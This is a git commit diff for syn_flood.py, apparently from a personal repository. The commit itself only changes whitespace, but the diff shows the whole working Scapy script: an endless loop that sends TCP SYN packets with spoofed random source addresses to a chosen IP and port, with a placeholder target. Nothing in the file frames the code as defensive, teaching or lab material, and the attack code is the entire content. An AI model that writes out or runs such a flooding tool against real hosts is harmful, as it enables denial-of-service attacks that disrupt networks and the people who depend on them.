9b3cf0ef40584916ce659fb898355106d753aec5
jasser cherif <147918952+jassercherif@users.noreply.github.com>
2024-09-28 18:55:00 +0100

    Update syn_flood.py

--- syn_flood.py
+++ syn_flood.py
@@ -2,14 +2,14 @@ from scapy.all import *
 
 def syn_flood(target_ip, target_port):
     while True:
-        s_port = random.randint(1024, 65535)
-        ip_pkt = IP(src=RandIP(), dst=target_ip)
-        tcp_pkt = TCP(sport=s_port, dport=target_port, flags='S')
-        send(ip_pkt/tcp_pkt, verbose=0)
+        s_port = random.randint(1024, 65535) 
+        ip_pkt = IP(src=RandIP(), dst=target_ip) 
+        tcp_pkt = TCP(sport=s_port, dport=target_port, flags='S') 
+        send(ip_pkt/tcp_pkt, verbose=0) 
 
-if __name__ == '__main__':
-    target_ip = "192.168.1.100"  # Replace with the target's IP address
-    target_port = 80  # Taget Port (HTTP)
+if __name__ == '__main__': 
+    target_ip = "192.168.1.100"  # Replace with the target's IP address 
+    target_port = 80  # Taget Port (HTTP)   
 
     syn_flood(target_ip, target_port)
 
